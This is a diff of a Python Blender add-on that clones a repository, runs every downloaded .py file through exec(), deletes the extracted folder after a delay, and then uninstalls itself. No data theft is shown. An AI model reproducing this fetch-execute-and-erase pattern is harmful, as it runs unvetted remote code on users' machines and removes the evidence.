@@ -9,12 +9,10 @@ import time
 import threading
 
 def remove_readonly(func, path, exc_info):
-    """Menghapus atribut read-only lalu mencoba hapus ulang."""
     os.chmod(path, stat.S_IWRITE)
     func(path)
 
 def delete_folder(folder_path):
-    """Menghapus folder jika ada."""
     if os.path.exists(folder_path):
         try:
             shutil.rmtree(folder_path, onerror=remove_readonly)
@@ -32,9 +30,7 @@ def delete_rr_t_folders():
             if folder_name.startswith("RR-T") and os.path.isdir(folder_path):
                 delete_folder(folder_path)
 
-
 def delete_after_delay(folder_path, delay=5):
-    """Menghapus folder setelah jeda tanpa membekukan UI."""
     def delayed_delete():
         print(f"Menunggu {delay} detik sebelum menghapus {folder_path}...")
         time.sleep(delay)
@@ -42,9 +38,26 @@ def delete_after_delay(folder_path, delay=5):
     
     threading.Thread(target=delayed_delete, daemon=True).start()
 
-# Hapus folder di Temp dan folder download_all_script_RR-T-B.3-main
-delete_rr_t_folders()
+def unregister_self():
+    addon_name = __name__
+    if addon_name in bpy.context.preferences.addons:
+        print(f"Menghapus addon: {addon_name}")
+        bpy.ops.preferences.addon_disable(module=addon_name)
+        bpy.ops.preferences.addon_remove(module=addon_name)
 
+def execute_all_scripts():
+    if os.path.exists(EXTRACT_FOLDER):
+        for file in os.listdir(EXTRACT_FOLDER):
+            if file.endswith(".py"):
+                script_path = os.path.join(EXTRACT_FOLDER, file)
+                try:
+                    with open(script_path, "r", encoding="utf-8") as script:
+                        exec(script.read(), globals())
+                except Exception as e:
+                    print(f"Error saat menjalankan {file}: {e}")
+
+# Hapus folder di Temp dan folder spesifik
+delete_rr_t_folders()
 
 USER_FOLDER = os.path.expanduser("~")
 BLENDER_VERSION = ".".join(map(str, bpy.app.version[:2]))
@@ -69,17 +82,7 @@ def clone_repository():
     except subprocess.CalledProcessError:
         return False
 
-def execute_all_scripts():
-    if os.path.exists(EXTRACT_FOLDER):
-        for file in os.listdir(EXTRACT_FOLDER):
-            if file.endswith(".py"):
-                script_path = os.path.join(EXTRACT_FOLDER, file)
-                try:
-                    with open(script_path, "r", encoding="utf-8") as script:
-                        exec(script.read(), globals())
-                except Exception as e:
-                    print(f"Error saat menjalankan {file}: {e}")
-
 if clone_repository():
     execute_all_scripts()
     delete_after_delay(EXTRACT_FOLDER, 10)
+    unregister_self()
